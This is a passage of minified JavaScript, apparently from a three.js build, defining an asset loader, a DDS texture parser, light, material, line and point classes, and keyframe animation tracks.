DOMParser;h=f.parseFromString(c,s);break;case"json":h=JSON.parse(c);break;default:h=c}setTimeout((function(){e&&e(h),r.manager.itemEnd(t)}),0)}catch(e){setTimeout((function(){n&&n(e),r.manager.itemError(t),r.manager.itemEnd(t)}),0)}}else{mr[t]=[],mr[t].push({onLoad:e,onProgress:i,onError:n});var m=new XMLHttpRequest;for(var _ in m.open("GET",t,!0),m.addEventListener("load",(function(e){var i=this.response;hr.add(t,i);var n=mr[t];if(delete mr[t],200===this.status||0===this.status){this.status;for(var a=0,o=n.length;a<o;a++)(s=n[a]).onLoad&&s.onLoad(i);r.manager.itemEnd(t)}else{for(a=0,o=n.length;a<o;a++){var s;(s=n[a]).onError&&s.onError(e)}r.manager.itemError(t),r.manager.itemEnd(t)}}),!1),m.addEventListener("progress",(function(e){for(var i=mr[t],n=0,r=i.length;n<r;n++){var a=i[n];a.onProgress&&a.onProgress(e)}}),!1),m.addEventListener("error",(function(e){var i=mr[t];delete mr[t];for(var n=0,a=i.length;n<a;n++){var o=i[n];o.onError&&o.onError(e)}r.manager.itemError(t),r.manager.itemEnd(t)}),!1),m.addEventListener("abort",(function(e){var i=mr[t];delete mr[t];for(var n=0,a=i.length;n<a;n++){var o=i[n];o.onError&&o.onError(e)}r.manager.itemError(t),r.manager.itemEnd(t)}),!1),void 0!==this.responseType&&(m.responseType=this.responseType),void 0!==this.withCredentials&&(m.withCredentials=this.withCredentials),m.overrideMimeType&&m.overrideMimeType(void 0!==this.mimeType?this.mimeType:"text/plain"),this.requestHeader)m.setRequestHeader(_,this.requestHeader[_]);m.send(null)}return r.manager.itemStart(t),m}mr[t].push({onLoad:e,onProgress:i,onError:n})},setPath:function(t){return this.path=t,this},setResponseType:function(t){return this.responseType=t,this},setWithCredentials:function(t){return this.withCredentials=t,this},setMimeType:function(t){return this.mimeType=t,this},setRequestHeader:function(t){return this.requestHeader=t,this}}),gr.prototype=Object.create(he.prototype),gr.prototype.constructor=gr,gr.prototype.isCompressedTexture=!0,Object.assign(vr.prototype,{load:function(t,e,i,n){var r=this,a=[],o=new gr;o.image=a;var s=new _r(this.manager);function l(l){s.load(t[l],(function(t){var i=r._parser(t,!0);a[l]={width:i.width,height:i.height,format:i.format,mipmaps:i.mipmaps},6===(c+=1)&&(1===i.mipmapCount&&(o.minFilter=Rt),o.format=i.format,o.needsUpdate=!0,e&&e(o))}),i,n)}if(s.setPath(this.path),s.setResponseType("arraybuffer"),Array.isArray(t))for(var c=0,h=0,u=t.length;h<u;++h)l(h);else s.load(t,(function(t){var i=r._parser(t,!0);if(i.isCubemap)for(var n=i.mipmaps.length/i.mipmapCount,s=0;s<n;s++){a[s]={mipmaps:[]};for(var l=0;l<i.mipmapCount;l++)a[s].mipmaps.push(i.mipmaps[s*i.mipmapCount+l]),a[s].format=i.format,a[s].width=i.width,a[s].height=i.height}else o.image.width=i.width,o.image.height=i.height,o.mipmaps=i.mipmaps;1===i.mipmapCount&&(o.minFilter=Rt),o.format=i.format,o.needsUpdate=!0,e&&e(o)}),i,n);return o},setPath:function(t){return this.path=t,this}});var yr,xr,br=function t(e){vr.call(this,e),this._parser=t.parse};function wr(t,e){De.call(this),this.type="Light",this.color=new be(t),this.intensity=void 0!==e?e:1,this.receiveShadow=void 0}function Tr(t){this.camera=t,this.bias=0,this.radius=1,this.mapSize=new Jt(512,512),this.map=null,this.matrix=new Qt}function Sr(){Tr.call(this,new rr(-5,5,5,-5,.5,500))}function Mr(t,e){wr.call(this,t,e),this.type="DirectionalLight",this.position.copy(De.DefaultUp),this.updateMatrix(),this.target=new De,this.shadow=new Sr}function Er(t,e,i,n){wr.call(this,t,e),this.type="PointLight",Object.defineProperty(this,"power",{get:function(){return 4*this.intensity*Math.PI},set:function(t){this.intensity=t/(4*Math.PI)}}),this.distance=void 0!==i?i:0,this.decay=void 0!==n?n:1,this.shadow=new Tr(new ar(90,1,.5,500))}function Lr(){Tr.call(this,new ar(50,1,.5,500))}function kr(t,e,i,n,r,a){wr.call(this,t,e),this.type="SpotLight",this.position.copy(De.DefaultUp),this.updateMatrix(),this.target=new De,Object.defineProperty(this,"power",{get:function(){return this.intensity*Math.PI},set:function(t){this.intensity=t/Math.PI}}),this.distance=void 0!==i?i:0,this.angle=void 0!==n?n:Math.PI/3,this.penumbra=void 0!==r?r:0,this.decay=void 0!==a?a:1,this.shadow=new Lr}function Ar(t){li.call(this),this.defines={STANDARD:""},this.type="MeshStandardMaterial",this.color=new be(16777215),this.roughness=.5,this.metalness=.5,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new be(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new Jt(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapIntensity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(t)}function Pr(t,e){this.array=t,this.stride=e,this.count=void 0!==t?t.length/e:0,this.dynamic=!1,this.updateRange={offset:0,count:-1},this.version=0}function Or(t,e,i,n){this.data=t,this.itemSize=e,this.offset=i,this.normalized=!0===n}function Cr(t,e){t&&t.isGeometry,Mi.call(this,t,e),this.type="SkinnedMesh",this.bindMode="attached",this.bindMatrix=new Qt,this.bindMatrixInverse=new Qt}function Rr(t){li.call(this),this.type="LineBasicMaterial",this.color=new be(16777215),this.linewidth=1,this.linecap="round",this.linejoin="round",this.lights=!1,this.setValues(t)}function Ir(t,e,i){De.call(this),this.type="Line",this.geometry=void 0!==t?t:new ii,this.material=void 0!==e?e:new Rr({color:16777215*Math.random()})}function Fr(t,e){Ir.call(this,t,e),this.type="LineSegments"}function Nr(t,e){Ir.call(this,t,e),this.type="LineLoop"}function zr(t){li.call(this),this.type="PointsMaterial",this.color=new be(16777215),this.map=null,this.size=1,this.sizeAttenuation=!0,this.morphTargets=!1,this.lights=!1,this.setValues(t)}function Dr(t,e){De.call(this),this.type="Points",this.geometry=void 0!==t?t:new ii,this.material=void 0!==e?e:new zr({color:16777215*Math.random()})}(br.prototype=Object.create(vr.prototype)).constructor=br,br.parse=function(t,e){var i={mipmaps:[],width:0,height:0,format:null,mipmapCount:1};function n(t){return t.charCodeAt(0)+(t.charCodeAt(1)<<8)+(t.charCodeAt(2)<<16)+(t.charCodeAt(3)<<24)}function r(t,e,i,n){for(var r=i*n*4,a=new Uint8Array(t,e,r),o=new Uint8Array(r),s=0,l=0,c=0;c<n;c++)for(var h=0;h<i;h++){var u=a[l],d=a[++l],p=a[++l],f=a[++l];l++,o[s]=p,o[++s]=d,o[++s]=u,o[++s]=f,s++}return o}var a,o=n("DXT1"),s=n("DXT3"),l=n("DXT5"),c=n("ETC1"),h=new Int32Array(t,0,31);if(542327876!==h[0])return i;if(4&!h[20])return i;var u=!1;switch(h[21]){case o:a=8,i.format=Ht;break;case s:a=16,i.format=Vt;break;case l:a=16,i.format=Yt;break;case c:a=8,i.format=36196;break;default:if(!(32===h[22]&&16711680&h[23]&&65280&h[24]&&255&h[25]&&4278190080&h[26]))return i;u=!0,a=64,i.format=Bt}i.mipmapCount=1,131072&h[2]&&!1!==e&&(i.mipmapCount=Math.max(1,h[7]));var d=h[28];if(i.isCubemap=!!(512&d),i.isCubemap&&(!(1024&d)||!(2048&d)||!(4096&d)||!(8192&d)||!(16384&d)||!(32768&d)))return i;i.width=h[4],i.height=h[3];for(var p=h[1]+4,f=i.isCubemap?6:1,m=0;m<f;m++)for(var _=i.width,g=i.height,v=0;v<i.mipmapCount;v++){if(u)var y=(x=r(t,p,_,g)).length;else{y=Math.max(4,_)/4*Math.max(4,g)/4*a;var x=new Uint8Array(t,p,y)}var b={data:x,width:_,height:g};i.mipmaps.push(b),p+=y,_=Math.max(_>>1,1),g=Math.max(g>>1,1)}return i},wr.prototype=Object.assign(Object.create(De.prototype),{constructor:wr,isLight:!0,copy:function(t){return De.prototype.copy.call(this,t),this.color.copy(t.color),this.intensity=t.intensity,this},toJSON:function(t){var e=De.prototype.toJSON.call(this,t);return e.object.color=this.color.getHex(),e.object.intensity=this.intensity,void 0!==this.groundColor&&(e.object.groundColor=this.groundColor.getHex()),void 0!==this.distance&&(e.object.distance=this.distance),void 0!==this.angle&&(e.object.angle=this.angle),void 0!==this.decay&&(e.object.decay=this.decay),void 0!==this.penumbra&&(e.object.penumbra=this.penumbra),void 0!==this.shadow&&(e.object.shadow=this.shadow.toJSON()),e}}),Object.assign(Tr.prototype,{copy:function(t){return this.camera=t.camera.clone(),this.bias=t.bias,this.radius=t.radius,this.mapSize.copy(t.mapSize),this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var t={};return 0!==this.bias&&(t.bias=this.bias),1!==this.radius&&(t.radius=this.radius),512===this.mapSize.x&&512===this.mapSize.y||(t.mapSize=this.mapSize.toArray()),t.camera=this.camera.toJSON(!1).object,delete t.camera.matrix,t}}),Sr.prototype=Object.assign(Object.create(Tr.prototype),{constructor:Sr}),Mr.prototype=Object.assign(Object.create(wr.prototype),{constructor:Mr,isDirectionalLight:!0,copy:function(t){return wr.prototype.copy.call(this,t),this.target=t.target.clone(),this.shadow=t.shadow.clone(),this}}),Er.prototype=Object.assign(Object.create(wr.prototype),{constructor:Er,isPointLight:!0,copy:function(t){return wr.prototype.copy.call(this,t),this.distance=t.distance,this.decay=t.decay,this.shadow=t.shadow.clone(),this}}),Lr.prototype=Object.assign(Object.create(Tr.prototype),{constructor:Lr,isSpotLightShadow:!0,update:function(t){var e=this.camera,i=2*Zt.RAD2DEG*t.angle,n=this.mapSize.width/this.mapSize.height,r=t.distance||e.far;i===e.fov&&n===e.aspect&&r===e.far||(e.fov=i,e.aspect=n,e.far=r,e.updateProjectionMatrix())}}),kr.prototype=Object.assign(Object.create(wr.prototype),{constructor:kr,isSpotLight:!0,copy:function(t){return wr.prototype.copy.call(this,t),this.distance=t.distance,this.angle=t.angle,this.penumbra=t.penumbra,this.decay=t.decay,this.target=t.target.clone(),this.shadow=t.shadow.clone(),this}}),Ar.prototype=Object.create(li.prototype),Ar.prototype.constructor=Ar,Ar.prototype.isMeshStandardMaterial=!0,Ar.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.defines={STANDARD:""},this.color.copy(t.color),this.roughness=t.roughness,this.metalness=t.metalness,this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.roughnessMap=t.roughnessMap,this.metalnessMap=t.metalnessMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.envMapIntensity=t.envMapIntensity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},Object.defineProperty(Pr.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),Object.assign(Pr.prototype,{isInterleavedBuffer:!0,onUploadCallback:function(){},setArray:function(t){if(Array.isArray(t))throw new TypeError("BufferAttribute: array should be a Typed Array.");return this.count=void 0!==t?t.length/this.stride:0,this.array=t,this},setDynamic:function(t){return this.dynamic=t,this},copy:function(t){return this.array=new t.array.constructor(t.array),this.count=t.count,this.stride=t.stride,this.dynamic=t.dynamic,this},copyAt:function(t,e,i){t*=this.stride,i*=e.stride;for(var n=0,r=this.stride;n<r;n++)this.array[t+n]=e.array[i+n];return this},set:function(t,e){return void 0===e&&(e=0),this.array.set(t,e),this},clone:function(){return(new this.constructor).copy(this)},onUpload:function(t){return this.onUploadCallback=t,this}}),Object.defineProperties(Or.prototype,{count:{get:function(){return this.data.count}},array:{get:function(){return this.data.array}}}),Object.assign(Or.prototype,{isInterleavedBufferAttribute:!0,setX:function(t,e){return this.data.array[t*this.data.stride+this.offset]=e,this},setY:function(t,e){return this.data.array[t*this.data.stride+this.offset+1]=e,this},setZ:function(t,e){return this.data.array[t*this.data.stride+this.offset+2]=e,this},setW:function(t,e){return this.data.array[t*this.data.stride+this.offset+3]=e,this},getX:function(t){return this.data.array[t*this.data.stride+this.offset]},getY:function(t){return this.data.array[t*this.data.stride+this.offset+1]},getZ:function(t){return this.data.array[t*this.data.stride+this.offset+2]},getW:function(t){return this.data.array[t*this.data.stride+this.offset+3]},setXY:function(t,e,i){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this},setXYZ:function(t,e,i,n){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this.data.array[t+2]=n,this},setXYZW:function(t,e,i,n,r){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this.data.array[t+2]=n,this.data.array[t+3]=r,this}}),Cr.prototype=Object.assign(Object.create(Mi.prototype),{constructor:Cr,isSkinnedMesh:!0,bind:function(t,e){this.skeleton=t,void 0===e&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),e=this.matrixWorld),this.bindMatrix.copy(e),this.bindMatrixInverse.getInverse(e)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){for(var t=new ke,e=this.geometry.attributes.skinWeight,i=0,n=e.count;i<n;i++){t.x=e.getX(i),t.y=e.getY(i),t.z=e.getZ(i),t.w=e.getW(i);var r=1/t.manhattanLength();r!==1/0?t.multiplyScalar(r):t.set(1,0,0,0),e.setXYZW(i,t.x,t.y,t.z,t.w)}},updateMatrixWorld:function(t){Mi.prototype.updateMatrixWorld.call(this,t),"attached"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):"detached"===this.bindMode&&this.bindMatrixInverse.getInverse(this.bindMatrix)},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}}),Rr.prototype=Object.create(li.prototype),Rr.prototype.constructor=Rr,Rr.prototype.isLineBasicMaterial=!0,Rr.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.linewidth=t.linewidth,this.linecap=t.linecap,this.linejoin=t.linejoin,this},Ir.prototype=Object.assign(Object.create(De.prototype),{constructor:Ir,isLine:!0,computeLineDistances:(yr=new ee,xr=new ee,function(){var t=this.geometry;if(t.isBufferGeometry){if(null===t.index){for(var e=t.attributes.position,i=[0],n=1,r=e.count;n<r;n++)yr.fromBufferAttribute(e,n-1),xr.fromBufferAttribute(e,n),i[n]=i[n-1],i[n]+=yr.distanceTo(xr);t.addAttribute("lineDistance",new Ke(i,1))}}else if(t.isGeometry){var a=t.vertices;for((i=t.lineDistances)[0]=0,n=1,r=a.length;n<r;n++)i[n]=i[n-1],i[n]+=a[n-1].distanceTo(a[n])}return this}),raycast:function(){var t=new Qt,e=new wi,i=new pe;return function(n,r){var a=n.linePrecision,o=this.geometry,s=this.matrixWorld;if(null===o.boundingSphere&&o.computeBoundingSphere(),i.copy(o.boundingSphere),i.applyMatrix4(s),i.radius+=a,!1!==n.ray.intersectsSphere(i)){t.getInverse(s),e.copy(n.ray).applyMatrix4(t);var l=a/((this.scale.x+this.scale.y+this.scale.z)/3),c=l*l,h=new ee,u=new ee,d=new ee,p=new ee,f=this&&this.isLineSegments?2:1;if(o.isBufferGeometry){var m=o.index,_=o.attributes.position.array;if(null!==m)for(var g=m.array,v=0,y=g.length-1;v<y;v+=f){var x=g[v],b=g[v+1];h.fromArray(_,3*x),u.fromArray(_,3*b),e.distanceSqToSegment(h,u,p,d)>c||(p.applyMatrix4(this.matrixWorld),(S=n.ray.origin.distanceTo(p))<n.near||S>n.far||r.push({distance:S,point:d.clone().applyMatrix4(this.matrixWorld),index:v,face:null,faceIndex:null,object:this}))}else for(v=0,y=_.length/3-1;v<y;v+=f)h.fromArray(_,3*v),u.fromArray(_,3*v+3),e.distanceSqToSegment(h,u,p,d)>c||(p.applyMatrix4(this.matrixWorld),(S=n.ray.origin.distanceTo(p))<n.near||S>n.far||r.push({distance:S,point:d.clone().applyMatrix4(this.matrixWorld),index:v,face:null,faceIndex:null,object:this}))}else if(o.isGeometry){var w=o.vertices,T=w.length;for(v=0;v<T-1;v+=f){var S;e.distanceSqToSegment(w[v],w[v+1],p,d)>c||(p.applyMatrix4(this.matrixWorld),(S=n.ray.origin.distanceTo(p))<n.near||S>n.far||r.push({distance:S,point:d.clone().applyMatrix4(this.matrixWorld),index:v,face:null,faceIndex:null,object:this}))}}}}}(),copy:function(t){return De.prototype.copy.call(this,t),this.geometry.copy(t.geometry),this.material.copy(t.material),this},clone:function(){return(new this.constructor).copy(this)}}),Fr.prototype=Object.assign(Object.create(Ir.prototype),{constructor:Fr,isLineSegments:!0,computeLineDistances:function(){var t=new ee,e=new ee;return function(){var i=this.geometry;if(i.isBufferGeometry){if(null===i.index){for(var n=i.attributes.position,r=[],a=0,o=n.count;a<o;a+=2)t.fromBufferAttribute(n,a),e.fromBufferAttribute(n,a+1),r[a]=0===a?0:r[a-1],r[a+1]=r[a]+t.distanceTo(e);i.addAttribute("lineDistance",new Ke(r,1))}}else if(i.isGeometry){var s=i.vertices;for(r=i.lineDistances,a=0,o=s.length;a<o;a+=2)t.copy(s[a]),e.copy(s[a+1]),r[a]=0===a?0:r[a-1],r[a+1]=r[a]+t.distanceTo(e)}return this}}()}),Nr.prototype=Object.assign(Object.create(Ir.prototype),{constructor:Nr,isLineLoop:!0}),zr.prototype=Object.create(li.prototype),zr.prototype.constructor=zr,zr.prototype.isPointsMaterial=!0,zr.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.size=t.size,this.sizeAttenuation=t.sizeAttenuation,this.morphTargets=t.morphTargets,this},Dr.prototype=Object.assign(Object.create(De.prototype),{constructor:Dr,isPoints:!0,raycast:function(){var t=new Qt,e=new wi,i=new pe;return function(n,r){var a=this,o=this.geometry,s=this.matrixWorld,l=n.params.Points.threshold;if(null===o.boundingSphere&&o.computeBoundingSphere(),i.copy(o.boundingSphere),i.applyMatrix4(s),i.radius+=l,!1!==n.ray.intersectsSphere(i)){t.getInverse(s),e.copy(n.ray).applyMatrix4(t);var c=l/((this.scale.x+this.scale.y+this.scale.z)/3),h=c*c,u=new ee,d=new ee;if(o.isBufferGeometry){var p=o.index,f=o.attributes.position.array;if(null!==p)for(var m=p.array,_=0,g=m.length;_<g;_++){var v=m[_];u.fromArray(f,3*v),b(u,v)}else{_=0;for(var y=f.length/3;_<y;_++)u.fromArray(f,3*_),b(u,_)}}else{var x=o.vertices;for(_=0,y=x.length;_<y;_++)b(x[_],_)}}function b(t,i){var o=e.distanceSqToPoint(t);if(o<h){e.closestPointToPoint(t,d),d.applyMatrix4(s);var l=n.ray.origin.distanceTo(d);if(l<n.near||l>n.far)return;r.push({distance:l,distanceToRay:Math.sqrt(o),point:d.clone(),index:i,face:null,object:a})}}}}(),clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var Gr,Ur,Br,jr,Wr,Hr,Vr={arraySlice:function(t,e,i){return Vr.isTypedArray(t)?new t.constructor(t.subarray(e,void 0!==i?i:t.length)):t.slice(e,i)},convertArray:function(t,e,i){return!t||!i&&t.constructor===e?t:"number"==typeof e.BYTES_PER_ELEMENT?new e(t):Array.prototype.slice.call(t)},isTypedArray:function(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)},getKeyframeOrder:function(t){for(var e=t.length,i=new Array(e),n=0;n!==e;++n)i[n]=n;return i.sort((function(e,i){return t[e]-t[i]})),i},sortedArray:function(t,e,i){for(var n=t.length,r=new t.constructor(n),a=0,o=0;o!==n;++a)for(var s=i[a]*e,l=0;l!==e;++l)r[o++]=t[s+l];return r},flattenJSON:function(t,e,i,n){for(var r=1,a=t[0];void 0!==a&&void 0===a[n];)a=t[r++];if(void 0!==a){var o=a[n];if(void 0!==o)if(Array.isArray(o))do{void 0!==(o=a[n])&&(e.push(a.time),i.push.apply(i,o)),a=t[r++]}while(void 0!==a);else if(void 0!==o.toArray)do{void 0!==(o=a[n])&&(e.push(a.time),o.toArray(i,i.length)),a=t[r++]}while(void 0!==a);else do{void 0!==(o=a[n])&&(e.push(a.time),i.push(o)),a=t[r++]}while(void 0!==a)}}};function Yr(t,e,i,n){fr.call(this,t,e,i,n),this._weightPrev=-0,this._offsetPrev=-0,this._weightNext=-0,this._offsetNext=-0}function Xr(t,e,i,n){fr.call(this,t,e,i,n)}function $r(t,e,i,n){fr.call(this,t,e,i,n)}function qr(t,e,i,n){if(void 0===t)throw new Error("KeyframeTrack: track name is undefined");if(void 0===e||0===e.length)throw new Error("KeyframeTrack: no keyframes in track named "+t);this.name=t,this.times=Vr.convertArray(e,this.TimeBufferType),this.values=Vr.convertArray(i,this.ValueBufferType),this.setInterpolation(n||this.DefaultInterpolation)}function Zr(t,e,i){qr.call(this,t,e,i)}function Kr(t,e,i,n){qr.call(this,t,e,i,n)}function Jr(t,e,i,n){qr.call(this,t,e,i,n)}function Qr(t,e,i,n){fr.call(this,t,e,i,n)}function ta(t,e,i,n){qr.call(this,t,e,i,n)}function ea(t,e,i,n){qr.call(this,t,e,i,n)}function ia(t,e,i,n){qr.call(this,t,e,i,n)}function na(t,e,i){this.name=t,this.tracks=i,this.duration=void 0!==e?e:-1,this.uuid=Zt.generateUUID(),this.duration<0&&this.resetDuration()}function ra(t){if(void 0===t.type)throw new Error("KeyframeTrack: track type undefined, can not parse");var e=function(t){switch(t.toLowerCase()){case"scalar":case"double":case"float":case"number":case"integer":return Jr;case"vector":case"vector2":case"vector3":case"vector4":return ia;case"color":return Kr;case"quaternion":return ta;case"bool":case"boolean":return Zr;case"string":return ea}throw new Error("KeyframeTrack: Unsupported typeName: "+t)}(t.type);if(void 0===t.times){var i=[],n=[];Vr.flattenJSON(t.keys,i,n,"value"),t.times=i,t.values=n}return void 0!==e.parse?e.parse(t):new e(t.name,t.times,t.values,t.interpolation)}function aa(){De.call(this),this.type="Bone"}function oa(t,e){if(t=t||[],this.bones=t.slice(0),this.boneMatrices=new Float32Array(16*this.bones.length),void 0===e)this.calculateInverses();else if(this.bones.length===e.length)this.boneInverses=e.slice(0);else{this.boneInverses=[];for(var i=0,n=this.bones.length;i<n;i++)this.boneInverses.push(new Qt)}}function sa(t){Rr.call(this),this.type="LineDashedMaterial",this.scale=1,this.dashSize=3,this.gapSize=1,this.setValues(t)}function la(t){li.call(this),this.type="MeshDepthMaterial",this.depthPacking=3200,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.setValues(t)}function ca(t){li.call(this),this.type="MeshDistanceMaterial",this.referencePosition=new ee,this.nearDistance=1,this.farDistance=1e3,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.fog=!1,this.lights=!1,this.setValues(t)}function ha(t){li.call(this),this.type="MeshLambertMaterial",this.color=new be(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new be(0),this.emissiveIntensity=1,this.emissiveMap=null,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(t)}function ua(t){li.call(this),this.type="MeshNormalMaterial",this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new Jt(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(t)}function da(t){li.call(this),this.type="MeshPhongMaterial",this.color=new be(16777215),this.specular=new be(1118481),this.shininess=30,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new be(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new Jt(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(t)}function pa(t){Ar.call(this),this.defines={PHYSICAL:""},this.type="MeshPhysicalMaterial",this.reflectivity=.5,this.clearCoat=0,this.clearCoatRoughness=0,this.setValues(t)}function fa(t){da.call(this),this.defines={TOON:""},this.type="MeshToonMaterial",this.gradientMap=null,this.setValues(t)}function ma(t){bi.call(this,t),this.type="RawShaderMaterial"}function _a(t){li.call(this),this.type="ShadowMaterial",this.color=new be(0),this.transparent=!0,this.setValues(t)}function ga(t){li.call(this),this.type="SpriteMaterial",this.color=new be(16777215),this.map=null,this.rotation=0,this.sizeAttenuation=!0,this.lights=!1,this.transparent=!0,this.setValues(t)}function va(t){this.manager=void 0!==t?t:cr,this.textures={}}function ya(){}Yr.prototype=Object.assign(Object.create(fr.prototype),{constructor:Yr,DefaultSettings_:{endingStart:Xt,endingEnd:Xt},intervalChanged_:function(t,e,i){var n=this.parameterPositions,r=t-2,a=t+1,o=n[r],s=n[a];if(void 0===o)switch(this.getSettings_().endingStart){case 2401:r=t,o=2*e-i;break;case 2402:o=e+n[r=n.length-2]-n[r+1];break;default:r=t,o=i}if(void 0===s)switch(this.getSettings_().endingEnd){case 2401:a=t,s=2*i-e;break;case 2402:a=1,s=i+n[1]-n[0];break;default:a=t-1,s=e}var l=.5*(i-e),c=this.valueSize;this._weightPrev=l/(e-o),this._weightNext=l/(s-i),this._offsetPrev=r*c,this._offsetNext=a*c},interpolate_:function(t,e,i,n){for(var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=t*o,l=s-o,c=this._offsetPrev,h=this._offsetNext,u=this._weightPrev,d=this._weightNext,p=(i-e)/(n-e),f=p*p,m=f*p,_=-u*m+2*u*f-u*p,g=(1+u)*m+(-1.5-2*u)*f+(-.5+u)*p+1,v=(-1-d)*m+(1.5+d)*f+.5*p,y=d*m-d*f,x=0;x!==o;++x)r[x]=_*a[c+x]+g*a[l+x]+v*a[s+x]+y*a[h+x];return r}}),Xr.prototype=Object.assign(Object.create(fr.prototype),{constructor:Xr,interpolate_:function(t,e,i,n){for(var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=t*o,l=s-o,c=(i-e)/(n-e),h=1-c,u=0;u!==o;++u)r[u]=a[l+u]*h+a[s+u]*c;return r}}),$r.prototype=Object.assign(Object.create(fr.prototype),{constructor:$r,interpolate_:function(t){return this.copySampleValue_(t-1)}}),Object.assign(qr,{toJSON:function(t){var e,i=t.constructor;if(void 0!==i.toJSON)e=i.toJSON(t);else{e={name:t.name,times:Vr.convertArray(t.times,Array),values:Vr.convertArray(t.values,Array)};var n=t.getInterpolation();n!==t.DefaultInterpolation&&(e.interpolation=n)}return e.type=t.ValueTypeName,e}}),Object.assign(qr.prototype,{constructor:qr,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(t){return new $r(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodLinear:function(t){return new Xr(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodSmooth:function(t){return new Yr(this.times,this.values,this.getValueSize(),t)},setInterpolation:function(t){var e;switch(t){case 2300:e=this.InterpolantFactoryMethodDiscrete;break;case 2301:e=this.InterpolantFactoryMethodLinear;break;case 2302:e=this.InterpolantFactoryMethodSmooth}if(void 0===e){var i="unsupported interpolation for "+this.ValueTypeName+" keyframe track named "+this.name;if(void 0===this.createInterpolant){if(t===this.DefaultInterpolation)throw new Error(i);this.setInterpolation(this.DefaultInterpolation)}return this}return this.createInterpolant=e,this},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(t){if(0!==t)for(var e=this.times,i=0,n=e.length;i!==n;++i)e[i]+=t;return this},scale:function(t){if(1!==t)for(var e=this.times,i=0,n=e.length;i!==n;++i)e[i]*=t;return this},trim:function(t,e){for(var i=this.times,n=i.length,r=0,a=n-1;r!==n&&i[r]<t;)++r;for(;-1!==a&&i[a]>e;)--a;if(++a,0!==r||a!==n){r>=a&&(r=(a=Math.max(a,1))-1);var o=this.getValueSize();this.times=Vr.arraySlice(i,r,a),this.values=Vr.arraySlice(this.values,r*o,a*o)}return this},validate:function(){var t=!0,e=this.getValueSize();e-Math.floor(e)!=0&&(t=!1);var i=this.times,n=this.values,r=i.length;0===r&&(t=!1);for(var a=null,o=0;o!==r;o++){var s=i[o];if("number"==typeof 